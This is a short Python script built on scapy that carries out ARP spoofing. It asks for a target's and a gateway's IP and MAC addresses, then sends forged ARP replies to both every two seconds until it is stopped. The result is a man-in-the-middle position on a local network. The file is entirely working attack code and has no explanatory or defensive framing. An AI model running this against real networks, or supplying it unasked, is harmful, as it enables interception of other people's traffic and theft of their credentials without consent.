from scapy.all import ARP, send
import time

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

target_ip = input("enter target ip addr: ")
target_mac = input("enter target mac addr: ")
gateway_ip = input("enter gateway ip ")
gateway_mac = input("enter gateway mac ")

try:
    print("\n[!] Starting ARP spoofing... Press CTRL+C to stop.\n")
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Stopped by user.")
 
